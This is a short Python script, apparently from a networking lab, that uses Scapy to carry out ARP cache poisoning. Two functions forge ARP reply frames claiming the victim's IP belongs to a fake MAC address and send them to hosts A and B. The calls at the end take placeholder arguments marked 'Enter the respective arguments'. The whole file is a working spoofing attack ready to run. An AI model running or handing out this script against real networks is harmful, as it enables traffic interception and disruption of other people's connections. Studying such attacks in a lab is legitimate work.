from scapy.all import*

def attackA(ipa_dest,mac_dest,victim_ip,fake_mac):
	VM_A_IP=ipa_dest
	VM_A_MAC=mac_dest
	VICTIM_IP=victim_ip
	FAKE_MAC=fake_mac

	print("Sending ARP Reply to A")

	ether=Ether()
	ether.dst=VM_A_MAC
	ether.src=FAKE_MAC

	arp=ARP()
	arp.psrc=VICTIM_IP
	arp.hwsrc=FAKE_MAC
	arp.pdst=VM_A_IP
	arp.op=2
	frame=ether/arp
	sendp(frame)

def attackB(ipa_dest,mac_dest,victim_ip,fake_mac):
        VM_A_IP=ipa_dest
        VM_A_MAC=mac_dest
        VICTIM_IP=victim_ip
        FAKE_MAC=fake_mac

        print("Sending ARP Reply to B")

        ether=Ether()
        ether.dst=VM_A_MAC
        ether.src=FAKE_MAC

        arp=ARP()
        arp.psrc=VICTIM_IP
        arp.hwsrc=FAKE_MAC
        arp.pdst=VM_A_IP
        arp.op=2
        frame=ether/arp
        sendp(frame)


attackA(ipa_dest,mac_dest,victim_ip,fake_mac)#Enter the respective arguments
attackB(ipa_dest,mac_dest,victim_ip,fake_mac)#Enter the respective arguments
